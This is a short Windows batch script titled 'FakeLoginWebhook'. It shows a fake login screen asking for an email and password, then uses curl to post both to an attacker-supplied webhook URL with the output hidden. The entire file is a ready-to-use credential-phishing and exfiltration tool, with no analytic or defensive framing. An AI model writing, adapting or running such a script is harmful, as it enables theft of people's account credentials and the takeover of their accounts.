@echo off
color F0
title FakeLoginWebhook
set /p email=EMAIL:  
cls
set /p pass=PASSWORD:  
pause

set webhook=PLACE_WEBHOOK_HERE

curl -X POST -H "Content-type: application/json" --data "{\"content\": \"`Email: %EMAIL%`\n`Password: %pass%`\"}" %webhook% >nul
exit
